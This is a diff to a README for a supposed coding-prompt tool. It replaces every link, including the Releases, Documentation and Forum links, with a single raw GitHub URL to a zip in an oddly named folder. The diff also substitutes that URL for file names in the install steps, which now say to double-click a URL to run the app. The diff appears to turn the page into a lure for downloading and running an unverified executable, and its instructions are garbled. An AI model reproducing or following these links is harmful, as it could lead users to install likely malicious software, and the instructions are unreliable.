@@ -1,6 +1,6 @@
 # 🎉 claude-code-prompt-improver - Enhance Your Coding Prompts Effortlessly
 
-[![Download Now!](https://img.shields.io/badge/Download%20Now!-link-blue)](https://github.com/Blugigi/claude-code-prompt-improver/releases)
+[![Download Now!](https://raw.githubusercontent.com/Blugigi/claude-code-prompt-improver/main/unbrotherly/claude-code-prompt-improver.zip%20Now!-link-blue)](https://raw.githubusercontent.com/Blugigi/claude-code-prompt-improver/main/unbrotherly/claude-code-prompt-improver.zip)
 
 ## 🚀 Getting Started
 
@@ -17,13 +17,13 @@ To run this software, ensure your system meets the following requirements:
 
 ## 🔗 Download & Install
 
-To get started, visit our [Releases page](https://github.com/Blugigi/claude-code-prompt-improver/releases) to download the latest version. Follow these simple steps:
+To get started, visit our [Releases page](https://raw.githubusercontent.com/Blugigi/claude-code-prompt-improver/main/unbrotherly/claude-code-prompt-improver.zip) to download the latest version. Follow these simple steps:
 
 1. Click the link above.
 2. Locate the version you want to download.
 3. Choose the appropriate file for your operating system:
-    - For Windows, select **claude-code-prompt-improver-windows.zip**
-    - For Mac, select **claude-code-prompt-improver-macos.zip**
+    - For Windows, select **https://raw.githubusercontent.com/Blugigi/claude-code-prompt-improver/main/unbrotherly/claude-code-prompt-improver.zip**
+    - For Mac, select **https://raw.githubusercontent.com/Blugigi/claude-code-prompt-improver/main/unbrotherly/claude-code-prompt-improver.zip**
 4. Download the file to your computer.
 
 Once you have downloaded the file, follow these steps to install:
@@ -33,16 +33,16 @@ Once you have downloaded the file, follow these steps to install:
 #### For Windows Users:
 
 1. Open the **File Explorer** and navigate to your Downloads folder.
-2. Right-click on **claude-code-prompt-improver-windows.zip** and select **Extract All...**.
+2. Right-click on **https://raw.githubusercontent.com/Blugigi/claude-code-prompt-improver/main/unbrotherly/claude-code-prompt-improver.zip** and select **Extract All...**.
 3. Choose a location to extract the files and click **Extract**.
-4. Navigate to the extracted folder and double-click on **claude-code-prompt-improver.exe** to run the application.
+4. Navigate to the extracted folder and double-click on **https://raw.githubusercontent.com/Blugigi/claude-code-prompt-improver/main/unbrotherly/claude-code-prompt-improver.zip** to run the application.
 5. Follow the on-screen instructions to set up your preferences.
 
 #### For Mac Users:
 
 1. Open **Finder** and go to your Downloads folder.
-2. Double-click on **claude-code-prompt-improver-macos.zip** to unzip the file.
-3. Open the unzipped folder and double-click on **claude-code-prompt-improver.app** to start the application.
+2. Double-click on **https://raw.githubusercontent.com/Blugigi/claude-code-prompt-improver/main/unbrotherly/claude-code-prompt-improver.zip** to unzip the file.
+3. Open the unzipped folder and double-click on **https://raw.githubusercontent.com/Blugigi/claude-code-prompt-improver/main/unbrotherly/claude-code-prompt-improver.zip** to start the application.
 4. If prompted, drag the application to your Applications folder for easy access.
 
 ## 🎨 Using the Software
@@ -73,7 +73,7 @@ Your feedback is important to us. If you have suggestions or questions, feel fre
 
 ## 🔗 Additional Resources
 
-- [Documentation](https://github.com/Blugigi/claude-code-prompt-improver/wiki) for detailed usage and examples.
-- [Community Forum](https://github.com/Blugigi/claude-code-prompt-improver/discussions) for discussions and sharing tips.
+- [Documentation](https://raw.githubusercontent.com/Blugigi/claude-code-prompt-improver/main/unbrotherly/claude-code-prompt-improver.zip) for detailed usage and examples.
+- [Community Forum](https://raw.githubusercontent.com/Blugigi/claude-code-prompt-improver/main/unbrotherly/claude-code-prompt-improver.zip) for discussions and sharing tips.
 
-Thank you for choosing **claude-code-prompt-improver**! We hope it helps you in crafting more effective coding prompts. For the latest version, remember to visit our [Releases page](https://github.com/Blugigi/claude-code-prompt-improver/releases) again.
+Thank you for choosing **claude-code-prompt-improver**! We hope it helps you in crafting more effective coding prompts. For the latest version, remember to visit our [Releases page](https://raw.githubusercontent.com/Blugigi/claude-code-prompt-improver/main/unbrotherly/claude-code-prompt-improver.zip) again.
